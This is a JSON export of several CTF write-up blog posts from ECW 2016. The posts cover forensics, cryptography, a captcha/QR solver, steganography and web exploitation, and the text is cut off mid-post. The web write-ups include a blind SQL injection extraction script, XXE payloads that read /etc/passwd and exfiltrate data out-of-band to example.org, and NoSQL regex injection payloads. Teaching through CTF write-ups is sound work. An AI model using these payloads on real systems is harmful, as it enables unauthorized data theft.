&quot;U2Nob29sQ1RGezUwbTNkNHk=&quot; | base64 -d SchoolCTF&#123;50m3d4y_17_w1ll_b3_54f3&#125; Part 2 &amp; part 4: 1flagPart2=17; flagPart4=b3 Part 3 (don't run the fork bomb): 1python -c &apos;part3=&quot;77316c6c&quot;; print part3.decode(&quot;hex&quot;)&apos; Part 5: 1Content-Meaning: none; flag-part-number=5 part-content=54f3&#125;; Flag: SchoolCTF{50m3d4y_17_w1ll_b3_54f3}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ECW - 150 - Alternative Persistent Threat - Forensics","slug":"ECW-2016-Alternative-Persistent-Threat","date":"2016-11-05T23:00:00.000Z","updated":"2017-02-07T18:23:37.622Z","comments":true,"path":"en/ECW-2016-Alternative-Persistent-Threat/","link":"","permalink":"https://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : European Cyber Week CTF Quals 2016 Website : challenge-ecw.fr Type : Online Format : Jeopardy - Student Description N.A. Solution We used Digital Forensics Framework (DFF) We can view that usb.dd is NTFS partition in the hex view so we mounted it as it. We browsed the files and this one retaind our attention: usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag. Its content is: 1&apos;Get the data from the default value of the key HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceContainers\\&#123;000001111-2345178-232416-99801&#125;&apos; So we need to find Windows registry and browse it. The location of these registry hives are as follows: HKEY_LOCAL_MACHINE \\SYSTEM : \\system32\\config\\system Source: http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7 We browsed it and the value of the key was: a2486aac827711258d0642176cc4f8c2. So the flag is ECW{a2486aac827711258d0642176cc4f8c2}. Bonus: /Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P was certainly the target location of the attack. There was also a no flag here.txt troll file in Windows\\system32\\config\\ containing a pretty list of fake flags: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;ECW&#123;860d8070c9fed931856856b2957316d9&#125;ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;ECW&#123;269c20f280f7326c674811f59ece9cab&#125;ECW&#123;656122abbb817863ae145539bb0eeb03&#125;ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;ECW&#123;01b1688f97f94776baae85d77b06048b&#125;ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;ECW&#123;f51b02427757e79621b5235d7efdf117&#125;ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;ECW&#123;5088741fd5456ef3471fe11022575e03&#125;ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;ECW&#123;1f77c389e0a69652980c341170d0834b&#125;ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;ECW&#123;35b88728559e409dd550eb818228c99e&#125;ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"ECW - 50 - Authentification - Web","slug":"ECW-2016-authentification","date":"2016-11-05T23:00:00.000Z","updated":"2017-02-07T18:23:37.612Z","comments":true,"path":"en/ECW-2016-authentification/","link":"","permalink":"https://rawsec.ml/en/ECW-2016-authentification/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : European Cyber Week CTF Quals 2016 Website : challenge-ecw.fr Type : Online Format : Jeopardy - Student Description N.A. Solution This is a bling SQL injection and Out-Of-Band (OOB) channel exfiltration is not working. When giving a correct (well formed) SQLi we get the message: Authentification valide. Le mot de passe est le flag.. So we are able to determine if a request is true or false. So the following requests gave us some details about the DB: ' or 1=1 # =&gt; MySQL Database ' or substring(version(),1,1)=5 # =&gt; MySQL 5 ' or (select 1)=1 # =&gt; subselect supported ' or (select substring(concat(1,password),1,1) limit 0,1)=1 # =&gt; column name is password So our payload will be SELECT password. And here is the script I wrote : 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env rubyrequire 'curb' # for get/post requestshostname = 'https://challenge-ecw.fr/chals/web100'nonce = 'myNonce'c = Curl::Easy.new(hostname) do |curl| curl.headers['Cookie'] = 'session=mySessionCookie' curl.headers['Referer'] = hostname curl.headers['Host'] = 'challenge-ecw.fr' curl.headers['Connection'] = 'keep-alive' curl.headers['Upgrade-Insecure-Requests'] = '1' #curl.verbose = trueend # Curlc.perform # send the requestif c.body_str.match(/Veuillez vous authentifier pour r/) puts '• Connexion to ECW works'end# Request we want to know the answerpayload = 'SELECT password'# Find the length of the passwordlength = 0while true do c.http_post(Curl::PostField.content('password', \"' OR LENGTH((#&#123;payload&#125;))=#&#123;length&#125; #\"), Curl::PostField.content('nonce', nonce)) c.perform if c.body_str.match(/Authentification valide\\. Le mot de passe est le flag\\./) puts \"Length: #&#123;length&#125;\" break else puts \"Length: not #&#123;length&#125;\" length+=1 endend# Find each char of the password one by oneanswer = \"\"(1..length).each do |offset| (32..126).each do |char| c.http_post(Curl::PostField.content('password', \"' OR ASCII(SUBSTRING((#&#123;payload&#125;),#&#123;offset&#125;,1))=#&#123;char&#125; #\"), Curl::PostField.content('nonce', nonce)) c.perform if c.body_str.match(/Authentification valide\\. Le mot de passe est le flag\\./) answer.concat(char.chr) puts \"Password: #&#123;answer&#125;\" break else puts \"Tried: #&#123;answer&#125;#&#123;char.chr&#125;\" end endend We can optimize the time to get the password because we know that the flag is ECW{md5(string)} and md5 hashes contains only lower letters and digits that is 32 chars long. So we can fix some parameters: Lenght of the password: 37 Alphabet: [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;E&quot;, &quot;C&quot;, &quot;W&quot;, &quot;{&quot;, &quot;}&quot;] That give us the more optimized script: 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/env rubyrequire 'curb' # for get/post requestshostname = 'https://challenge-ecw.fr/chals/web100'nonce = 'myNonce'c = Curl::Easy.new(hostname) do |curl| curl.headers['Cookie'] = 'session=mySessionCookie' curl.headers['Referer'] = hostname curl.headers['Host'] = 'challenge-ecw.fr' curl.headers['Connection'] = 'keep-alive' curl.headers['Upgrade-Insecure-Requests'] = '1' #curl.verbose = trueend # Curlc.perform # send the requestif c.body_str.match(/Veuillez vous authentifier pour r/) puts '• Connexion to ECW works'end# Request we want to know the answerpayload = 'SELECT password'length = 37# Find each char of the password one by oneanswer = \"\"ECW_flag_alphabet_array = ('a'..'f').to_a + (0.to_s..9.to_s).to_a + ['E', 'C', 'W', '&#123;', '&#125;'](1..length).each do |offset| ECW_flag_alphabet_array.each do |char| c.http_post(Curl::PostField.content('password', \"' OR ASCII(SUBSTRING((#&#123;payload&#125;),#&#123;offset&#125;,1))=#&#123;char.ord&#125; #\"), Curl::PostField.content('nonce', nonce)) c.perform if c.body_str.match(/Authentification valide\\. Le mot de passe est le flag\\./) answer.concat(char) puts \"Password: #&#123;answer&#125;\" break else puts \"Tried: #&#123;answer&#125;#&#123;char&#125;\" end endend So we got the flag: ECW{d3832d5a1ef4c3bef82b87ced5f50e7d}. BONUS: I used my script to get the username: 12SELECT user()User: ecw@localhost","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ECW - 50 - Ave, César! - Cryptography","slug":"ECW-2016-ave-cesar","date":"2016-11-05T23:00:00.000Z","updated":"2017-02-07T18:23:37.608Z","comments":true,"path":"en/ECW-2016-ave-cesar/","link":"","permalink":"https://rawsec.ml/en/ECW-2016-ave-cesar/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : European Cyber Week CTF Quals 2016 Website : challenge-ecw.fr Type : Online Format : Jeopardy - Student Description N.A. Solution This was not Caesar as title suggested but Vigenere code, a troll I guess... With some frequency analysis and bruteforce we found: The key was: contest. And the message was: remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.. That gave us the flag: ECW{d8c3155c86a6eef18db845317b8b5a72}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ECW - 150 - Carnet d'adresses - Web","slug":"ECW-2016-carnet-dadresse","date":"2016-11-05T23:00:00.000Z","updated":"2017-02-07T18:23:37.632Z","comments":true,"path":"en/ECW-2016-carnet-dadresse/","link":"","permalink":"https://rawsec.ml/en/ECW-2016-carnet-dadresse/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : European Cyber Week CTF Quals 2016 Website : challenge-ecw.fr Type : Online Format : Jeopardy - Student Description N.A. Solution This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working. xxe We are given the following form: 12345678910111213&lt;contacts&gt; &lt;contact&gt; &lt;name&gt;Jean Dupont&lt;/name&gt; &lt;phone&gt;00 11 22 33 44&lt;/phone&gt; &lt;adress&gt;42 rue CTF&lt;/adress&gt; &lt;zipcode&gt;42000&lt;/zipcode&gt; &lt;city&gt;ECW&lt;/city&gt; &lt;/contact&gt; &lt;contact&gt; &lt;name&gt;Jack Dupont&lt;/name&gt; &lt;phone&gt;01 02 03 04 05&lt;/phone&gt; &lt;/contact&gt;&lt;/contacts&gt; And the following answer confirming the well formated XML request: 12345678Création du fichier ./MNfloDfo.xmlImport du fichier : Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adressesSuppression du fichier ./MNfloDfo.xml We should be able to leak data into the answer banner. Confirmation that entities are interpreted: 123456789101112131415&lt;!DOCTYPE contacts[&lt;!ENTITY xxe \"XXE vuln\"&gt;]&gt;&lt;contacts&gt; &lt;contact&gt; &lt;name&gt;&amp;xxe;t&lt;/name&gt; &lt;phone&gt;00 11 22 33 44&lt;/phone&gt; &lt;adress&gt;42 rue CTF&lt;/adress&gt; &lt;zipcode&gt;42000&lt;/zipcode&gt; &lt;city&gt;ECW&lt;/city&gt; &lt;/contact&gt; &lt;contact&gt; &lt;name&gt;Jack Dupont&lt;/name&gt; &lt;phone&gt;01 02 03 04 05&lt;/phone&gt; &lt;/contact&gt;&lt;/contacts&gt; 12345678Création du fichier ./J2tuDR8g.xmlImport du fichier : Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adressesSuppression du fichier ./J2tuDR8g.xml Nice that's working so try to leak some files: 12&lt;!DOCTYPE contacts[&lt;!ENTITY xxe SYSTEM \"http://example.org/test\"&gt;]&gt; =&gt; doesn't work 1&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt; =&gt; doesn't work 1&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" &gt;]&gt; =&gt; doesn't work [...] and we tried a lot of logical filename on various operating systems. But how did we find out the right? The challenge required no logic but only guessing ... I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe: 12345&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;&lt;contacts&gt; &lt;contact&gt; &lt;name&gt;&amp;external;&lt;/name&gt; [...] xxe_file: 12&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt; And a tried a lot... But no, in fact no files were leakable exept flag.txt. It was impossible to find out it was just guessing because rules and description didn't mention any convention. I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked. Realistic challenge should have be better. But indeed some people find it realy easily as flag.txt can be common in CTF. I insist on the fact that's is only CTF guessing, in real life this never occurs. Here was the easy XXE : 123456789101112131415&lt;!DOCTYPE contacts[&lt;!ENTITY xxe SYSTEM \"flag.txt\"&gt;]&gt;&lt;contacts&gt; &lt;contact&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;phone&gt;00 11 22 33 44&lt;/phone&gt; &lt;adress&gt;42 rue CTF&lt;/adress&gt; &lt;zipcode&gt;42000&lt;/zipcode&gt; &lt;city&gt;ECW&lt;/city&gt; &lt;/contact&gt; &lt;contact&gt; &lt;name&gt;Jack Dupont&lt;/name&gt; &lt;phone&gt;01 02 03 04 05&lt;/phone&gt; &lt;/contact&gt;&lt;/contacts&gt; 12345678Création du fichier ./WDpFYEM5.xmlImport du fichier : Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adressesSuppression du fichier ./WDpFYEM5.xml","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ECW - 150 - Dilemme - Misc","slug":"ECW-2016-dilemme","date":"2016-11-05T23:00:00.000Z","updated":"2017-02-07T18:23:37.592Z","comments":true,"path":"en/ECW-2016-dilemme/","link":"","permalink":"https://rawsec.ml/en/ECW-2016-dilemme/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : European Cyber Week CTF Quals 2016 Website : challenge-ecw.fr Type : Online Format : Jeopardy - Student Description N.A. Solution For this challenge we needed to solve a captcha and a QR code as faster as possible. For this I wrote a ruby script: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/env rubyrequire 'base64' # to decode base64 imagesrequire 'zxing' # to solve qr coderequire 'curb' # for get/post requests### Crawling the website to get the base64 QRCode ###hostname = 'https://challenge-ecw.fr/chals/divers200'c = Curl::Easy.new(hostname) do |curl| curl.headers['Cookie'] = 'session=mySessionCookie' curl.headers['Referer'] = hostname curl.headers['Host'] = 'challenge-ecw.fr' curl.headers['Connection'] = 'keep-alive' curl.headers['Upgrade-Insecure-Requests'] = '1' #curl.verbose = trueend # Curlc.perform#puts c.body_str### Parse the output ###qrcode_b64 = c.body_str.match(/QRCode\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]qrcode_file = 'qrcode.png'captcha_b64 = c.body_str.match(/Captcha\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]captcha_file = 'captcha.png'### QRCode : base64 to png ###File.open(qrcode_file, 'wb') do |f| f.write(Base64.decode64(qrcode_b64))end### Captcha : base64 to png ###File.open(captcha_file, 'wb') do |f| f.write(Base64.decode64(captcha_b64))end### QRCode : png to text string ###qrcode_answer = ZXing.decode qrcode_fileputs 'QRCode : '.concat(qrcode_answer)### Captcha : png to text string ###captcha_answer = `python2 myCaptchaSolver.py`.chompputs 'Captcha : '.concat(captcha_answer)### Send the answer ###nonce = 'myNonce'c.http_post(Curl::PostField.content('captcha', captcha_answer), Curl::PostField.content('qrcode', qrcode_answer), Curl::PostField.content('nonce', nonce))c.performputs c.body_str.match(/&lt;center&gt;(.*)&lt;\\/center&gt;/).captures[0]# Redo the whole process one more timeqrcode_b64 = c.body_str.match(/QRCode Win\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]qrcode_file = 'qrcode.png'captcha_b64 = c.body_str.match(/Captcha Win\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]captcha_file = 'captcha.png'File.open(qrcode_file, 'wb') do |f| f.write(Base64.decode64(qrcode_b64))endFile.open(captcha_file, 'wb') do |f| f.write(Base64.decode64(captcha_b64))endqrcode_answer = ZXing.decode qrcode_fileputs 'QRCode : '.concat(qrcode_answer)captcha_answer = `python2 myCaptchaSolver.py`.chompputs 'Captcha : '.concat(captcha_answer)c.http_post(Curl::PostField.content('captcha', captcha_answer), Curl::PostField.content('qrcode', qrcode_answer), Curl::PostField.content('nonce', nonce))c.performputs c.body_str.match(/&lt;center&gt;(.*)&lt;\\/center&gt;/).captures[0]puts \"Flag : \" + captcha_answer + qrcode_answer### Wait for avoiding Jruby to crash ###sleep(0.5)### Remove temporary file ###File.delete(qrcode_file)File.delete(captcha_file)File.delete(\"output.gif\") Script is working but curb is not very quick and the ZXing ruby gem is just a port of the java version of ZXing with Jruby and is amazingly slow and buggy! So the whole script process take 9 seconds. That's too slow! Let's try to optimize the execution speed with more quicker tools: replace curb gem using libcurb directly with curl replace ZXing with a custom script using PIl and pytesseract 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/env rubyrequire 'base64' # to decode base64 images### Crawling the website to get the base64 QRCode ###hostname = 'https://challenge-ecw.fr/chals/divers200'cookies = 'session=mySessionCookie'body_str = `curl https://challenge-ecw.fr/chals/divers200 --cookie '#&#123;cookies&#125;'`### Parse the output ###qrcode_b64 = body_str.match(/QRCode\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]qrcode_file = 'qrcode.png'captcha_b64 = body_str.match(/Captcha\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]captcha_file = 'captcha.png'### QRCode : base64 to png ###File.open(qrcode_file, 'wb') do |f| f.write(Base64.decode64(qrcode_b64))end### Captcha : base64 to png ###File.open(captcha_file, 'wb') do |f| f.write(Base64.decode64(captcha_b64))end### QRCode : png to text string ###qrcode_answer = `python2 myQRCodeSolver.py`.chompputs 'QRCode : '.concat(qrcode_answer)### Captcha : png to text string ###captcha_answer = `python2 myCaptchaSolver.py`.chompputs 'Captcha : '.concat(captcha_answer)### Send the answer ###nonce = 'myNonce'server_answer = `curl https://challenge-ecw.fr/chals/divers200 --cookie '#&#123;cookies&#125;' -X POST -F \"captcha=#&#123;captcha_answer&#125;\" -F \"qrcode=#&#123;qrcode_answer&#125;\" -F \"nonce=#&#123;nonce&#125;\"`puts '&gt;&gt;&gt; ' + server_answer.match(/&lt;center&gt;(.*)&lt;\\/center&gt;/).captures[0]# Redo the whole process one more timeqrcode_b64 = server_answer.match(/QRCode Win\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]qrcode_file = 'qrcode.png'captcha_b64 = server_answer.match(/Captcha Win\" src=\"data:image\\/png;base64,(.*)\" height/).captures[0]captcha_file = 'captcha.png'File.open(qrcode_file, 'wb') do |f| f.write(Base64.decode64(qrcode_b64))endFile.open(captcha_file, 'wb') do |f| f.write(Base64.decode64(captcha_b64))endqrcode_answer = `python2 myQRCodeSolver.py`.chompputs 'QRCode : '.concat(qrcode_answer)captcha_answer = `python2 myCaptchaSolver.py`.chompputs 'Captcha : '.concat(captcha_answer)puts \"Flag : \" + captcha_answer + qrcode_answer### Remove temporary file ###File.delete(qrcode_file)File.delete(captcha_file)File.delete(\"output.gif\") Here is my custom captcha solver myCaptchaSolver.py: 1234567891011121314151617181920212223from PIL import Imagefrom pytesseract import image_to_stringim = Image.open(\"captcha.png\")im = im.convert(\"P\")im2 = Image.new(\"P\",im.size,255)im = im.convert(\"P\")temp = &#123;&#125;for x in range(im.size[1]): for y in range(im.size[0]): pix = im.getpixel((y,x)) temp[pix] = pix if pix == 1: # these are the numbers to get im2.putpixel((y,x),0)im2.save(\"output.gif\")im2.load()print (image_to_string(im2)) Here is my custom QR code solver myQRCodeSolver.py: 1234import qrtoolsqr = qrtools.QR()qr.decode(\"qrcode.png\")print qr.data Flag: ECW{20cbf8e17eb7e62936e3602b498776e6}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"ECW - 100 - Pas seulement BSON - Web","slug":"ECW-2016-pas-seulement-BSON","date":"2016-11-05T23:00:00.000Z","updated":"2017-02-07T18:23:37.625Z","comments":true,"path":"en/ECW-2016-pas-seulement-BSON/","link":"","permalink":"https://rawsec.ml/en/ECW-2016-pas-seulement-BSON/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : European Cyber Week CTF Quals 2016 Website : challenge-ecw.fr Type : Online Format : Jeopardy - Student Description N.A. Solution This is a NoSQL injection on the famous MongoDB with certain PHP at backend. We used the query operators to perform the NoSQLi. We tested the following payload in our script with the ne query operator to confirm presence of the vulnerability: 1password[$ne]=nosql&amp;nonce=myNonce Then we retrieved the password letter by letter with the regex query operator of NoSQL. At the beginning the script uses the following paylods: 12345password[$regex]=ECW&#123;.&#123;32&#125;&#125;&amp;nonce=myNoncepassword[$regex]=ECW&#123;a.&#123;31&#125;&#125;&amp;nonce=myNoncepassword[$regex]=ECW&#123;b.&#123;31&#125;&#125;&amp;nonce=myNoncepassword[$regex]=ECW&#123;c.&#123;31&#125;&#125;&amp;nonce=myNonce[...] Each bad request results in an authentification failure and when the right char is found with a succesful authentification, the script with try to find the next chars with something like: 12345password[$regex]=ECW&#123;2.&#123;31&#125;&#125;&amp;nonce=myNoncepassword[$regex]=ECW&#123;2a.&#123;30&#125;&#125;&amp;nonce=myNoncepassword[$regex]=ECW&#123;2b.&#123;30&#125;&#125;&amp;nonce=myNoncepassword[$regex]=ECW&#123;2c.&#123;30&#125;&#125;&amp;nonce=myNonce[...] So here is our script that we adapted from the first web challenge Authentification. 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env rubyrequire 'curb' # for get/post requestshostname = 'https://challenge-ecw.fr/chals/web200'nonce = 'myNonce'c = Curl::Easy.new(hostname) do |curl| curl.headers['Cookie'] = 'session=mySessionCookie' curl.headers['Referer'] = hostname curl.headers['Host'] = 'challenge-ecw.fr' curl.headers['Connection'] = 'keep-alive' curl.headers['Upgrade-Insecure-Requests'] = '1' #curl.verbose = trueend # Curlc.perform # send the requestif c.body_str.match(/Un nouveau m/) puts '• Connexion to ECW works'endlength = 32 # md5(hash)# Find each char of the password one by oneanswer = \"\"ECW_flag_alphabet_array = ('a'..'f').to_a + (0.to_s..9.to_s).to_a # md5(hash)(1..length).each do |offset| ECW_flag_alphabet_array.each do |char| c.http_post(Curl::PostField.content('password[$regex]', \"ECW&#123;#&#123;answer&#125;#&#123;char&#125;.&#123;#&#123;length - offset&#125;&#125;&#125;\"), Curl::PostField.content('nonce', nonce)) c.perform if c.body_str.match(/Authentification valide\\. Le mot de passe est le flag\\./) answer.concat(char) puts \"Password: ECW&#123;#&#123;answer&#125;&#125;\" break else puts \"Tried: ECW&#123;#&#123;answer&#125;#&#123;char&#125;&#125;\" end endend","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ECW - 50 - Mario - Misc","slug":"ECW-2016-mario","date":"2016-11-05T23:00:00.000Z","updated":"2017-02-07T18:23:37.608Z","comments":true,"path":"en/ECW-2016-mario/","link":"","permalink":"https://rawsec.ml/en/ECW-2016-mario/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : European Cyber Week CTF Quals 2016 Website : challenge-ecw.fr Type : Online Format : Jeopardy - Student Description N.A. Solution Donwload the mario music on the web page and let's analyse it with binwalk: 1234567891011121314151617[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]$ binwalk hurry-overworld.wav DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------1288 0x508 YAFFS filesystem16416 0x4020 YAFFS filesystem137724 0x219FC MySQL ISAM compressed data file Version 1432662 0x69A16 YAFFS filesystem530464 0x81820 YAFFS filesystem1631770 0x18E61A YAFFS filesystem1749494 0x1AB1F6 MySQL MISAM index file Version 52335928 0x23A4B8 MySQL ISAM index file Version 14111020 0x3EBAAC MySQL MISAM compressed data file Version 29465612 0x906F0C YAFFS filesystem11467052 0xAEF92C PNG image, 883 x 648, 8-bit/color RGBA, non-interlaced11467151 0xAEF98F Zlib compressed data, best compression Did you see the embed PNG? Let's extract it with foremost. Now we can check the image file. 123[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]$ file mario-hidden.pngmario-hidden.png: PNG image data, 883 x 648, 8-bit/color RGBA, non-interlaced Just 